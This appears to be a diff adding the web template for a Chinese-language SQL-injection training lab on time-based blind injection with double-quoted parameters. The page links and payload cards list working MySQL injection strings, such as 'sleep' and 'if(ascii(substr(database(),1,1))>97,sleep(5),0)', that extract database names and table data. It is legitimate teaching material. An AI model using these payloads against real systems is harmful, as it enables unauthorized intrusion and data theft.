@@ -1,0 +1,145 @@
+{% extends "base.html" %}
+
+{% block title %}Less-10: GET - Blind - Time based - Double Quotes{% endblock %}
+
+{% block content %}
+<div class="container mt-4">
+    <div class="row">
+        <div class="col-lg-8">
+            <div class="card lab-card">
+                <div class="card-header">
+                    <h2><i class="fas fa-clock"></i> Less-10: GET - 时间盲注 - 双引号</h2>
+                    <span class="badge badge-danger">时间盲注</span>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-info">
+                        <strong>学习目标：</strong> 理解双引号环境下的时间盲注，掌握不同引号类型的注入技巧
+                    </div>
+
+                    <form method="GET" class="mb-4">
+                        <div class="form-group">
+                            <label for="id">输入ID参数：</label>
+                            <input type="text" class="form-control" name="id" id="id" 
+                                   value="{{ id_param }}" placeholder="例如: 1">
+                        </div>
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-search"></i> 测试注入
+                        </button>
+                    </form>
+
+                    {% if id_param %}
+                    <div class="result-section">
+                        <h5>测试结果：</h5>
+                        <div class="alert alert-info">
+                            <strong>响应时间：</strong> {{ response_time }}秒<br>
+                            <strong>状态：</strong> {{ message }}
+                        </div>
+                    </div>
+                    {% endif %}
+
+                    <div class="quick-tests mt-4">
+                        <h5>快速测试：</h5>
+                        <div class="btn-group-vertical w-100" role="group">
+                            <a href="?id=1" class="btn btn-outline-primary">正常查询: id=1</a>
+                            <a href='?id=1"' class="btn btn-outline-warning">语法错误: id=1"</a>
+                            <a href='?id=1" and sleep(3)--+' class="btn btn-outline-danger">时间延迟: id=1" and sleep(3)--+</a>
+                            <a href='?id=1" and if(1=1,sleep(3),0)--+' class="btn btn-outline-success">条件延迟(真): id=1" and if(1=1,sleep(3),0)--+</a>
+                            <a href='?id=1" and if(1=2,sleep(3),0)--+' class="btn btn-outline-info">条件延迟(假): id=1" and if(1=2,sleep(3),0)--+</a>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-warning mt-4">
+                        <strong><i class="fas fa-exclamation-triangle"></i> 注意：</strong>
+                        此实验使用双引号包围参数，注入载荷需要相应调整。
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-4">
+            <div class="card info-card">
+                <div class="card-header">
+                    <h5><i class="fas fa-lightbulb"></i> 漏洞分析</h5>
+                </div>
+                <div class="card-body">
+                    <h6>漏洞类型：</h6>
+                    <p>时间盲注 - 双引号环境</p>
+                    
+                    <h6>与单引号的区别：</h6>
+                    <ul>
+                        <li>使用双引号闭合</li>
+                        <li>载荷需要调整</li>
+                        <li>原理完全相同</li>
+                        <li>检测方法一致</li>
+                    </ul>
+
+                    <h6>SQL查询结构：</h6>
+                    <code>SELECT * FROM users WHERE id = "用户输入"</code>
+                </div>
+            </div>
+
+            <div class="card payload-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-code"></i> 双引号载荷</h5>
+                </div>
+                <div class="card-body">
+                    <h6>基础延迟：</h6>
+                    <code>1" and sleep(5)--+</code><br>
+                    <code>1" or sleep(5)--+</code><br><br>
+                    
+                    <h6>条件延迟：</h6>
+                    <code>1" and if(1=1,sleep(5),0)--+</code><br>
+                    <code>1" and if(length(database())>5,sleep(5),0)--+</code><br><br>
+                    
+                    <h6>数据提取：</h6>
+                    <code>1" and if(ascii(substr(database(),1,1))>97,sleep(5),0)--+</code><br>
+                    <code>1" and if((select count(*) from users)>0,sleep(5),0)--+</code>
+                </div>
+            </div>
+
+            <div class="card comparison-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-balance-scale"></i> 引号类型对比</h5>
+                </div>
+                <div class="card-body">
+                    <table class="table table-sm">
+                        <thead>
+                            <tr>
+                                <th>类型</th>
+                                <th>闭合方式</th>
+                                <th>示例载荷</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>单引号</td>
+                                <td>'</td>
+                                <td>1' and sleep(5)--+</td>
+                            </tr>
+                            <tr class="table-active">
+                                <td>双引号</td>
+                                <td>"</td>
+                                <td>1" and sleep(5)--+</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card tips-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-lightbulb"></i> 实战技巧</h5>
+                </div>
+                <div class="card-body">
+                    <ul>
+                        <li>先确定引号类型</li>
+                        <li>测试基础延迟</li>
+                        <li>构造条件判断</li>
+                        <li>自动化脚本提取</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %} 
